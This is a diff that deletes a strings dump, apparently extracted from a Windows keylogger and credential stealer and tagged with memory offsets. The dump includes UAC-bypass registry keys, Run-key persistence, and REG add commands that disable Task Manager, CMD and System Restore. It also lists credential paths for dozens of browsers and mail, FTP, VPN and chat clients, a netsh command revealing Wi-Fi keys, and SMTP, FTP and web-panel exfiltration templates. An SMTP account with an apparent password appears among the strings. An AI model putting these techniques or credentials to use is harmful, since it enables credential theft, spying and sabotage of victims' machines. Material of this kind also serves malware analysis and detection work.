@@ -1,1816 +1,0 @@
-yyyy-MM-dd HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 618960
-Not resolved yet. 618992
-SOFTWARE\Microsoft\Windows NT\CurrentVersion 618896
-ProductId 619184
-76487-337-8429955-22614									 619088
-smtp 618544
-Software\Classes 619120
-ms-settings\shell\open\command 619536
-Software\Classes\ms-settings\shell\open\command 619312
-DelegateExecute 619728
-Software\Classes 619760
-ms-settings\shell\open\command 619664
-C:\Windows\System32\computerdefaults.exe 619952
-Software\Classes\ms-settings\shell 619856
-open\command 619888
-Software\Classes 624400
-mscfile\shell\open\command 624176
-C:\Windows\System32\eventvwr.exe 624592
-Software\Classes\mscfile\shell 624624
-open\command 624528
-IsInRole 624816
-%startupfolder% 624720
-\%insfolder%\%insname%
- 624752
-Windows 7 625168
-Windows 8 624944
-Windows 10 625360
-\temp.tmp 625392
-Windows 10 625296
-%startupfolder% 625584
-\%insfolder%\ 625488
-%startupfolder% 625520
-\%insfolder%\ 625936
-Software\Microsoft\Windows\CurrentVersion\Run 625712
-%insregname% 626128
-SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
- 626160
-%insregname% 626064
-webpanel 622192
-Shutdown -r -t 5 622256
-True 622160
-user-agent 622608
-Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) 622384
-%DownLink% 622800
-\%filename% 622832
-\%filename% 622736
-Johnson									 623024
-Miller
- 622928
-michael									 622960
-Emily 623152
-Abby 623376
-John 623568
-SELECT * FROM Win32_Processor 623792
-root\CIMV2 623600
-SELECT * FROM Win32_VideoController
-
-
-
-
-
-
-
-
-
-
-
-
- 623504
-Name 623696
-Name 623728
-AdapterRAM 624144
-Unknown									 623920
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 562928
-cookies									 562832
-webpanel 562896
-smtp 563120
-MM/dd/yyyy HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 563024
- Recovered Cookies 563056
-<br>OSFullName:  563696
-<br>ComputerName:  563664
-<br>CPU:  563600
-<br>RAM:  563888
-sales@satamwa.com 564240
-cookie
- 564016
-<br>IP:  563792
-<hr> 563824
-Time: 
- 563472
-<br>UserName:  563248
-yyyy_MM_dd_HH_mm_ss
-
-
-
-
-
-
-
-
-
-
-
-
- 564432
-Cookie_									 564464
-.zip 564368
-.jpeg 564656
-<hr> 561904
-sales@satamwa.com 561808
-screenshot 562096
-webpanel 564560
-smtp 560688
-<br>CPU:  561680
-<br>RAM:  561456
-<br>IP:  561872
-MM/dd/yyyy HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 561104
- Screen Capture 561136
-yyyy_MM_dd_HH_mm_ss
-
-
-
-
-
-
-
-
-
-
-
-
- 562000
-<br>OSFullName:  561264
-Time: 
- 561040
-Screen_									 562032
-.jpeg 562448
-<br>UserName:  561328
-<br>ComputerName:  561232
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 564592
-screenshots 560912
-/log.tmp 562224
-MM/dd/yyyy HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 562640
-webpanel 562672
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 562576
-keylog
- 566960
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 566864
-keylog
- 566896
-<br>[(
- 567312
-)]<br>
- 567088
-<br> 567504
-smtp 567536
-<br>RAM:  568848
-<br>IP:  568624
-<hr> 564944
-<br>ComputerName:  568496
- Keystrokes  567440
-<br>CPU:  568432
-Time: 
- 567728
-<br>OSFullName:  568400
-<br>IP : 567632
-<hr> 567664
-sales@satamwa.com 568080
-keylog
- 567856
-sales@satamwa.com 564976
-keylog
- 564880
- Keystrokes 568272
-Time: 
- 568304
-<br>UserName:  568208
-<br>[(
- 565168
-)]<br>
- 565072
-<br> 565104
-yyyy_MM_dd_HH_mm_ss
-
-
-
-
-
-
-
-
-
-
-
-
- 565520
-Keystrokes_ 566416
-Keystrokes_ 565296
-.html 565712
-<html>Time:  565744
-<br>UserName:  565648
-<br>ComputerName:  565936
-<br>OSFullName:  565840
-<br>CPU:  565872
-<br>RAM:  566288
-<br>IP:  566064
-<hr> 566480
-</html>									 566512
-.html 566704
-<html>Time:  566608
-<br>UserName:  566640
-<br>ComputerName:  571152
-<br>OSFullName:  570928
-<br>CPU:  571344
-<br>RAM:  571376
-<br>IP:  571280
-<hr> 571568
-</html>									 571472
-<br>[(
- 571504
-)]<br>
- 571920
-<br> 571696
-Not resolved yet. 572112
-http://checkip.amazonaws.com/ 572144
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 572048
-update
- 572336
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 572240
-info 572272
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-client={8}
-link={9}
-username={10}
-password={11}
-screen_link={12}
-
-
-
-
-
-
-
-
-
-
-
-
- 572688
-uninstall 572464
-uninstall 572880
-Software\Microsoft\Windows NT\CurrentVersion\Windows 572912
-Load 572816
-Software\Microsoft\Windows\CurrentVersion\Run 569008
-%insregname% 568912
-%ftphost%/ 568944
-Close 569712
-Write 569488
-Length
- 569776
-Length
- 569584
-%ftpuser% 569360
-%ftppassword% 569136
-STOR 569552
-Length
- 569680
-%ftphost%/ 570128
-%ftpuser% 569904
-%ftppassword% 570320
-STOR 570352
-MM/dd/yyyy HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 570256
-type={0}
-hwid={1}
-time={2}
-pcname={3}
-logdata={4}
-screen={5}
-ipadd={6}
-webcam_link={7}
-screen_link={8}
-[passwords] 570544
-passwords 570448
-Opera Browser 570480
-Opera Software\Opera Stable\Login Data
- 570896
-Yandex Browser 570672
-Yandex\YandexBrowser\User Data 575184
-360 Browser 575216
-360Chrome\Chrome\User Data 575120
-Iridium Browser 575408
-Iridium\User Data 575312
-Orbitum									 573744
-Orbitum\User Data 574160
-Sputnik									 574192
-Sputnik\Sputnik\User Data 574096
-Uran 574384
-uCozMedia\Uran\User Data 574288
-Vivaldi									 574320
-Vivaldi\User Data 574736
-Citrio
- 574512
-CatalinaGroup\Citrio\User Data 574928
-Amigo 576304
-Amigo\User Data 576720
-Elements Browser 573424
-Elements Browser\User Data 573328
-Epic Privacy 573616
-Epic Privacy Browser\User Data 573520
-Kometa
- 573552
-Kometa\User Data 573968
-Comodo Dragon 575344
-Comodo\Dragon\User Data									 575760
-Cool Novo 575536
-MapleStudio\ChromePlus\User Data 575952
-Torch Browser 576176
-Torch\User Data 576080
-CentBrowser 576944
-CentBrowser\User Data 576848
-Chedot
- 576880
-Chedot\User Data 573200
-Coccoc
- 572976
-CocCoc\Browser\User Data 573392
-7Star 576112
-7Star\7Star\User Data 576528
-Chromium 575984
-Chromium\User Data 575888
-Brave 576752
-BraveSoftware\Brave-Browser\User Data 576656
-Liebao Browser 574960
-liebao\User Data 574864
-Sleipnir 6 579248
-Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
-
-
-
-
-
-
-
-
-
-
-
-
- 579152
-QIP Surf 579184
-QIP Surf\User Data 579600
-Coowon
- 579376
-Coowon\Coowon\User Data									 579792
-APPDATA									 579824
-\CoreFTP\sites.idx 579728
-HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\ 580016
-Host 579920
-<hr> 578000
-
-client[]={0}
-link[]={1}
-username[]={2}
-password[]={3} 581136
-HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites 580144
-User 580560
-HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites 580592
-HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites 580496
-Name 580784
-CoreFTP									 580688
-smtp 580912
-Username:  577168
-<br> 577456
-Password:  577360
-<br> 577392
-Application:  577808
-<br> 577584
-webpanel 580720
-URL:       577232
-<br> 577264
-HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites 579952
-Port 580368
-webpanel 578032
-smtp 578224
-
-client[]={0}
-link[]={1}
-username[]={2}
-password[]={3} 577936
-Application:  578704
-<br> 578992
-URL:       578128
-<br> 578160
-Username:  578576
-<br> 578352
-Password:  578768
-<br> 578800
-<hr> 578896
-smtp 578928
- Recovered Accounts 583440
-Time: 
- 583216
-<br>IP:  583792
-<hr> 584208
-sales@satamwa.com 583984
-keylog
- 584400
-<br>UserName:  583632
-<br>ComputerName:  583664
-<br>RAM:  583760
-<br>OSFullName:  583568
-<br>CPU:  583856
-yyyy_MM_dd_HH_mm_ss 584432
-Recovery_ 584336
-.html 584624
-<html>Time:  584528
-<br>UserName:  584560
-<br>ComputerName:  584976
-<br>OSFullName:  584752
-<br>CPU:  585168
-<br>RAM:  585200
-<br>IP:  585104
-<hr> 581296
-</html>									 581200
-webpanel 581232
-sales@satamwa.com 582000
-?MZMRQzTKx)6! 582416
-mail.privateemail.com 582192
-sales@satamwa.com 581648
-text/html 581840
-yyyy_MM_dd_HH_mm_ss
-
-
-
-
-
-
-
-
-
-
-
-
- 581872
-.html 581776
-yyyy_MM_dd_HH_mm_ss
-
-
-
-
-
-
-
-
-
-
-
-
- 582064
-.html 581968
-keylog
- 581424
-:Zone.Identifier 582608
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 582832
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System 582640
-EnableLUA 582544
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f 587472
-REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f 582736
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
- 582960
-REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f 587632
-REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f 588048
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore 587696
-DisableSR 587600
-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System 587504
-DisableRegistryTools 587408
-MSCONFIG.EXE 588240
-HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System 582768
-DisableCMD 583184
-SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
-
-
-
-
-
-
-
-
-
-
-
-
- 587824
-\tmpG 588272
-.tmp 588176
-%urlkey% 588464
-%PostURL% 588368
-application/x-www-form-urlencoded 588592
-Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729) 588400
-POST 588816
-&amp; 589008
-&lt; 589040
-&gt; 588944
-&quot;
- 589232
-<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span> 589136
-<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br> 589168
-<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;><b>[  585488
-</b> 585264
- <b>]</b> <span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;>( 585680
-MM/dd/yyyy HH:mm:ss
-
-
-
-
-
-
-
-
-
-
-
-
- 585712
-)</span></span><br>
-
-
-
-
-
-
-
-
-
-
-
-
- 585616
-&lt; 589552
-<font color=#008000>{ENTER}</font> 592080
-<br> 592112
-<font color=#008000>&rarr;</font> 587216
-</font>									 585840
-<br> 586256
-&quot;
- 589744
-<font color=#008000>{CTRL}</font> 593200
-<font color=#008000>{F12}</font> 593008
-<font color=#008000>{F9}</font> 592784
-<font color=#008000>&larr;</font> 586800
-&gt; 589456
-<font color=#008000>{CAPSLOCK}</font> 586576
-&amp; 589520
-<font color=#008000>{ALT+F4}</font>
-
-
-
-
-
-
-
-
-
-
-
-
- 586448
-<font color=#008000>{ALT+TAB}</font> 586032
-<font color=#008000>{F11}</font> 592976
-<font color=#008000>{BACK}</font> 585808
-<font color=#008000>{DEL}</font> 587248
-<font color=#008000>{F1}</font> 592016
-<font color=#008000>{Insert}</font>
-
-
-
-
-
-
-
-
-
-
-
-
- 591440
-<font color=#008000>&uarr;</font> 586608
-False 585904
-<font color=#008000>{F10}</font> 593072
-control									 593424
-<font color=#008000>{PageUp}</font>
-
-
-
-
-
-
-
-
-
-
-
-
- 591664
-<font color=#008000>{F6}</font> 592432
-<font color=#008000>{F2}</font> 592304
-<font color=#008000>{F8}</font> 592880
-<font color=#008000>{F7}</font> 592848
-<font color=#008000>{PageDown}</font> 591888
-<font color=#008000>{HOME}</font> 591536
-<font color=#008000>{ESC}</font> 586384
-<font color=#008000>{F3}</font> 592208
-<font color=#008000>{NumLock}</font> 591472
-<font color=#008000>{Win}</font> 586672
-<font color=#008000>{TAB}</font> 586480
-<font color=#008000>&darr;</font> 587024
-<font color=#008000>{F5}</font> 592656
-<font color=#008000>{F4}</font> 592240
-<font color=#008000>{END}</font> 587152
-.lnk 615248
-IconLocation 620784
-Save 620688
-.lnk 615280
-Arguments 621456
-/c start  621744
-&explorer /root,"%CD% 621648
-" & exit 621680
-IconLocation 622096
-%SystemRoot%\system32\SHELL32.dll,3
-
-
-
-
-
-
-
-
-
-
-
-
- 621872
-Save 618192
-WScript.Shell 615472
-CreateShortcut 615888
-.lnk 615920
-TargetPath 615824
-cmd.exe									 620208
- .lnk 620976
-WScript.Shell 620880
-CreateShortcut 620912
- .lnk 621328
-WorkingDirectory 620112
-Arguments 620144
-/c start  620560
-&start 									 620336
- & exit									 620752
-TargetPath 621104
-cmd.exe									 621520
-WorkingDirectory 621552
-.lnk 615696
-Software\Classes\ 618224
-OpenSubKey 618128
-OpenSubKey 618416
-GetValue 618320
-\DefaultIcon\ 618352
-GetValue 618768
-.zip 589648
-Cookies									 589680
-Chrome
- 590096
-\Google\Chrome\User Data 589872
-CentBrowser 530960
-CentBrowser\User Data 530736
-Chedot
- 531152
-Chedot\User Data 531184
-CocCoc
- 531088
-CocCoc\Browser\User Data 531376
-Opera 590288
-Opera Software\Opera Stable 590320
-Yandex
- 590224
-Yandex\YandexBrowser\User Data 590512
-360 Browser 590416
-\360Chrome\Chrome\User Data 590448
-uCozMedia 528400
-uCozMedia\Uran\User Data 528176
-QIP Surf 529296
-QIP Surf\User Data 529584
-QQ Browser 529488
-Tencent\QQBrowser\User Data 529520
-Torch Browser 591184
-Torch\User Data 591216
-Brave Browser 530192
-BraveSoftware\Brave-Browser\User Data 529968
-Iridium Browser 530384
-\Iridium\User Data 530416
-7Star 530320
-7Star\7Star\User Data 530608
-Amigo 530512
-Amigo\User Data 530544
-Comodo Dragon 590864
-Comodo\Dragon\User Data									 590640
-CoolNovo 591056
-MapleStudio\ChromePlus\User Data 591088
-SRWare Iron 590992
-Chromium\User Data 591280
-Elements Browser 531280
-Elements Browser\User Data 531312
-Epic Privacy Browser 531728
-Epic Privacy Browser\User Data 531504
-Vivaldi									 528592
-Vivaldi\User Data 528624
-Sleipnir 6 528528
-Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
-
-
-
-
-
-
-
-
-
-
-
-
- 528816
-Citrio
- 528720
-CatalinaGroup\Citrio\User Data 528752
-Coowon
- 529168
-Coowon\Coowon\User Data									 528944
-Liebao Browser 529360
-liebao\User Data 529392
-Kometa
- 531920
-Kometa\User Data 531952
-Orbitum									 531856
-Orbitum\User Data 528048
-Sputnik									 527952
-Sputnik\Sputnik\User Data 527984
-UC Browser 529936
-UCBrowser\ 529712
-.zip 534224
-cookies.sqlite 534256
-Firefox									 534160
-APPDATA									 534448
-\Mozilla\Firefox\ 534352
-Postbox									 534384
-APPDATA									 534800
-\Postbox\ 534576
-PaleMoon 532592
-APPDATA									 533008
-\Moonchild Productions\Pale Moon\ 532784
-K-Meleon 532016
-APPDATA									 532432
-\K-Meleon\ 532464
-IceCat
- 532368
-APPDATA									 532656
-\Mozilla\icecat\ 532560
-SeaMonkey 535216
-APPDATA									 535120
-\Mozilla\SeaMonkey\
-
-
-
-
-
-
-
-
-
-
-
-
- 535152
-Thunderbird 534992
-APPDATA									 535024
-\Thunderbird\ 534928
-Flock 535568
-APPDATA									 535344
-\Flock\Browser\ 535760
-BlackHawk 535792
-APPDATA									 535696
-\NETGATE Technologies\BlackHawk\ 535984
-CyberFox 535888
-APPDATA									 535920
-\8pecxstudios\Cyberfox\									 532240
-IceDragon 533200
-APPDATA									 533232
-\Comodo\IceDragon\ 533136
-WaterFox 533424
-APPDATA									 533328
-\Waterfox\ 533360
-Path=([A-z0-9\/\.\-]+)
- 533776
-profiles.ini 533552
-\Default\ 533968
-Profile									 534000
-None 533904
-win32_processor 538288
-processorID 538192
-WinMgmts: 538224
-InstancesOf 538640
-Win32_BaseBoard 538416
-SerialNumber 538832
-origin_url 538864
-username_value 538768
-password_value 539056
-\Default\Login Data
-
-
-
-
-
-
-
-
-
-
-
-
- 538960
-\Login Data 538992
-\Login Data 539184
-Profile									 539408
-\Google\Chrome\User Data\ 539600
-Chrome
- 539632
-logins
- 539536
-Firefox									 539824
-Firefox									 539728
-IELibrary 539760
-IELibrary 540176
-IELibrary.InternetExplorer 539952
-GetSavedPasswords 536272
-UserName 536304
-Password 536208
-Browser									 536496
-E69D7838-91B5-4FC9-89D5-230D4D4CC2BC 537808
-Windows Domain Certificate Credential 537840
-PtrToStructure 542704
-ToInt64									 542608
-SchemaId 542896
-pAuthenticatorElement 543440
-pResourceElement 542800
-pIdentityElement 542832
-LastModified 543248
-IE/Edge									 543472
-pPackageSid 543024
-3CCD5499-87A8-4B10-A215-608888DD3B55 537040
-Windows Web Password Credential 537072
-2F1A6504-0641-44CF-8BB5-3612D865F2E5 536848
-Windows Secure Note
-
-
-
-
-
-
-
-
-
-
-
-
- 536624
-77BC582B-F0A6-4E15-4E80-61736B6F3B29 537616
-Windows Credentials
-
-
-
-
-
-
-
-
-
-
-
-
- 537392
-3E0E35BE-1B77-43E7-B873-AED901B6275B 537744
-Windows Domain Password Credential 538032
-3C886FF3-2669-4AA2-A8FB-3F6759A77548 537936
-Windows Extended Credential 537968
-00000000-0000-0000-0000-000000000000 542480
-82BD0E67-9FEA-4748-8672-D5EFE5B779B0 542256
-Windows Generic Credential 542672
-Minor 536432
-154E23D0-C644-4E6F-8CE6-5069272F999F 536976
-Windows Credential Picker Protector
-
-
-
-
-
-
-
-
-
-
-
-
- 537264
-4BF4C442-9B8A-41A0-B380-DD4A704DDB28 537168
-Web Credentials 537200
-Major 536400
-Value 543664
-Type 543376
-\Common Files\Apple\Apple Application Support\plutil.exe 543568
-\Apple Computer\Preferences\keychain.plist 543600
-SeaMonkey 544016
-SeaMonkey 543792
-logins
- 544208
-UCBrowser\ 544240
-journal									 540336
-Login Data 544144
-UC Browser 540240
-wow_logins 540272
-Tencent\QQBrowser\User Data 540688
-\Default\EncryptedStorage 540464
-\EncryptedStorage 540912
-Profile									 540880
-entries									 540816
-category 541104
-Password 541008
-str3 541040
-str2 541456
-blob0 541232
-QQ Browser 541648
-PopPassword 541680
-SmtpPassword 541584
-Software\IncrediMail\Identities\ 541872
-PopPassword 541808
-SmtpPassword 542224
-incredimail 546544
-EmailAddress 542000
-SmtpServer 546512
-\Accounts_New 541776
-HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
- 546448
-current									 546736
-Eudora
- 547280
-Settings 547088
-Settings 546640
-ReturnAddress 546864
-SavePasswordText 546672
-Thunderbird 547312
-Thunderbird 547216
-BlackHawk 547504
-BlackHawk 547408
-CyberFox 547440
-CyberFox 547856
-K-Meleon 547632
-K-Meleon 548048
-IceCat
- 548080
-IceCat
- 547984
-PaleMoon 548272
-PaleMoon 548176
-IceDragon 548208
-IceDragon 544528
-WaterFox 544304
-WaterFox 544720
-\falkon\profiles\ 544752
-startProfile="([A-z0-9\/\.]+)" 544656
-profiles.ini 544944
-\browsedata.db 544848
-autofill 544880
-startProfile=([A-z0-9\/\.]+) 545072
-profiles.ini 545488
-Backend=([A-z0-9\/\.-]+) 545520
-\settings.ini 545424
-Falkon Browser 545296
-\browsedata.db 545712
-autofill 545616
-Falkon Browser 545648
-passkey0 546288
-master_passphrase_salt=(.+) 546192
-\Claws-mail 546064
-\clawsrc 545840
-\clawsrc 546256
-master_passphrase_pbkdf2_rounds=(.+) 550576
-use_master_passphrase=(.+) 550480
-\accountrc 550512
-smtp_server 550928
-address									 550704
-account									 551120
-\passwordstorerc 551152
-{(.*),(.*)}(.*) 551056
-ClawsMail 551344
-TransformFinalBlock
-
-
-
-
-
-
-
-
-
-
-
-
- 551248
-Substring 551280
-IterationCount 551696
-GetBytes 551472
-Postbox									 551888
-Postbox									 551920
-signons3.txt 551824
-Flock Browser 548784
-objects									 552112
-objects									 552016
-objects									 552048
-Data 552464
-objects									 552240
-objects									 548560
-Data 548592
-DecryptTripleDes 548496
-netsh 548688
-wlan show profile 548720
-All User Profile * : (?<profile>.*)
-
-
-
-
-
-
-
-
-
-
-
-
- 548912
-profile									 549328
-All User Profile 549136
-Wi-Fi 549360
-wlan show profile name=" 549264
-" key=clear 549552
-Key Content * : (?<password>.*) 549456
-password 549488
-No Password! 549904
-ALLUSERSPROFILE 549680
-DynDNS\Updater\config.dyndns 550096
-password= 550032
-username= 550128
-http://DynDns.com 550224
-t6KzXhCh 550320
-DynDNS
- 550256
-\accounts.xml 554896
-\accounts.xml 555184
-APPDATA									 554768
-\Psi\profiles 554544
-APPDATA									 554960
-\Psi+\profiles 554992
-name 555088
-password 555120
-Psi/Psi+ 555536
-Software\OpenVPN-GUI\configs 555312
-Software\OpenVPN-GUI\configs 555728
-Software\OpenVPN-GUI\configs\ 555760
-username 555664
-auth-data 555952
-entropy									 555856
-Open VPN 555888
-USERPROFILE 556304
-\OpenVPN\config\ 556080
-remote 									 556496
-remote 									 556528
-ovpn file not found
-
-
-
-
-
-
-
-
-
-
-
-
- 556432
-APPDATA									 552624
-\FileZilla\recentservers.xml 552528
-<Server> 552560
-<Pass encoding="base64"> 553744
-<Pass>
- 553968
-FileZilla 554064
-<Pass encoding="base64"> 553520
-</Pass>									 553936
-<Host>
- 552976
-<User>
- 553392
-<User>
- 553296
-</User>									 553328
-<Host>
- 552752
-</Host>									 553168
-<Port>
- 553200
-</Port>									 553104
-<Pass>
- 553872
-</Pass>									 554160
-SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions 554096
-PortNumber 558736
-WinSCP
- 558928
-UserName 554288
-Password 558800
-PublicKeyFile 558832
-[PRIVATE KEY LOCATION: "{0}"] 559024
-HostName 554512
-APPDATA									 558960
-Username 559376
-All Users 559152
-\FlashFXP\3quick.dat 559568
-port= 559600
-user= 559504
-pass= 559792
-created= 559696
-FlashFXP 559728
-SystemDrive 560144
-\FTP Navigator\Ftplist.txt 559920
-FTP Navigator 560464
-No Password 560272
-User 560560
-Server
- 560336
-Password 560368
-Programfiles(x86) 560496
-programfiles 556816
-\jDownloader\config\database.script
-
-
-
-
-
-
-
-
-
-
-
-
- 556592
-INSERT INTO CONFIG VALUES('AccountController',' 556944
-JDownloader 557232
-programfiles(x86) 557008
-\jDownloader\config\database.script
-
-
-
-
-
-
-
-
-
-
-
-
- 557040
-HKEY_CURRENT_USER\Software\Paltalk\
-
-
-
-
-
-
-
-
-
-
-
-
- 557168
-http://Paltalk.com 557584
-Paltalk									 557360
-Software\Paltalk 557136
-APPDATA									 557776
-\.purple\accounts.xml 557808
-<protocol> 557936
-</protocol> 558352
-<name>
- 558128
-</name>									 558544
-<password> 558576
-</password> 558480
-Pidgin
- 497328
-APPDATA									 557712
-\.purple\accounts.xml 558000
-<account> 557904
-APPDATA									 497232
-\SmartFTP\Client 2.0\Favorites\Quick Connect\ 497264
-APPDATA									 497680
-\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml 497456
-<User>
- 498000
-</User>									 498032
-<Password> 498448
-</Password> 498224
-<Port>
- 497808
-</Port>									 498096
-<Host>
- 497872
-</Host>									 497904
-<Name>
- 498640
-</Name>									 498672
-SmartFTP 498576
-appdata									 498800
-\Ipswitch\WS_FTP\Sites\ws_ftp.ini 499216
-appdata									 498864
-\Ipswitch\WS_FTP\Sites\ws_ftp.ini 498768
-WS_FTP
- 495312
-HOST 498992
-PWD= 495344
-Substring 495888
-Substring 495664
-PWD= 495248
-Substring 495536
-Length
- 495440
-Length
- 495472
-Password decryption failed! 496080
-Mode 496112
-Padding									 496016
-CreateDecryptor 496304
-SystemDrive 496208
-\cftp\Ftplist.txt 496240
-;Port=
- 496848
-;Password= 496880
-Name= 501520
-;Server= 501296
-;User=
- 496784
-;Anonymous= 497072
-;Server= 496656
-;Port=
- 496432
-;Password= 496976
-;User=
- 497008
-FTPCommander 501712
-\FTPGetter\servers.xml
- 501744
-<server> 501648
-<server_ip> 501936
-FTPGetter 503056
-<server_ip> 501840
-</server_ip> 501872
-<server_port> 502288
-</server_port> 502064
-<server_user_password>
- 502608
-</server_user_password>									 502640
-<server_user_name> 502512
-</server_user_name>
-
-
-
-
-
-
-
-
-
-
-
-
- 502416
-<server_user_password>
- 502704
-<server_user_name> 502480
-HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC 502832
-HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC 503248
-USERname 503280
-Password 503184
-UserName 499376
-Password 499280
-NO-IP 499728
-http://no-ip.com 499312
-http://no-ip.com 499504
-NO-IP 499920
-+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz 499856
-Input contains illegal character ' 500144
-Input text must be a multiple of 4 characters! 499952
-appdata									 500048
-\The Bat! 500080
-appdata									 500496
-\The Bat! 500272
-\Account.CFN 500688
-\Account.CFN 500720
-TheBat
- 500624
-HKEY_CURRENT_USER\Software\RimArts\B2\Settings 500912
-DataDir									 500816
-Folder.lst 500848
-\Mailbox.ini 501264
-Account									 505776
-PassWd
- 505680
-Becky!
- 505712
-Account									 501040
-SMTPServer 505552
-Account									 505584
-MailAddress 505488
-\Trillian\users\global\accounts.dat
-
-
-
-
-
-
-
-
-
-
-
-
- 506128
-Account									 505904
-Accounts 506320
-Trillian 506448
-Account									 506256
-Password 506544
-www.trillian.im 506352
-Length
- 506480
-Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676 506896
-Email 507024
-IMAP Password 507312
-POP3 Password 507216
-HTTP Password 507248
-SMTP Password 503568
-IMAP Password 503344
-POP3 Password 503760
-HTTP Password 503792
-SMTP Password 503696
-Email 503984
-GetBytes 503888
-SMTP Server 503920
-SMTP Server 504336
-SMTP Server 504112
-Not found! 504528
-Outlook									 504560
-Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676 507088
-Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676 507120
-Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676 506672
-HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview 504464
-Executable 504752
-\VirtualStore\Program Files\Foxmail\mail\ 505232
-\VirtualStore\Program Files (x86)\Foxmail\mail\ 509520
-!empty!									 511280
-\Storage\ 505104
-\mail\
- 505296
-Dispose									 510512
-\Account.stg 509744
-\fox.temp 510160
-\fox.temp 510096
-\fox.temp 510384
-SMTPHost 510960
-IncomingServer 510864
-Account									 511152
-Foxmail									 507600
-Close 510736
-\VirtualStore\Program Files (x86)\Foxmail\mail\ 509552
-\fox.temp 510192
-Password 511088
-\Accounts\Account.rec0
- 509968
-POP3Host 510928
-\VirtualStore\Program Files\Foxmail\mail\ 509616
-Read 510320
-\Storage\ 504880
-HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1 504656
-FoxmailPath 504688
-Length
- 510288
-POP3Password 511504
-\mail\
- 505328
-MailAddress 511056
-No Data! 507632
-\Opera Mail\Opera Mail\wand.dat 507536
-\Opera Mail\Opera Mail\wand.dat 507824
-opera:
- 507728
-Opera Mail 507760
-abcçdefgğhıijklmnoöpqrsştuüvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+=
-  508176
-appdata									 507952
-\Pocomail\accounts.ini
- 508368
-appdata									 508400
-\Pocomail\accounts.ini
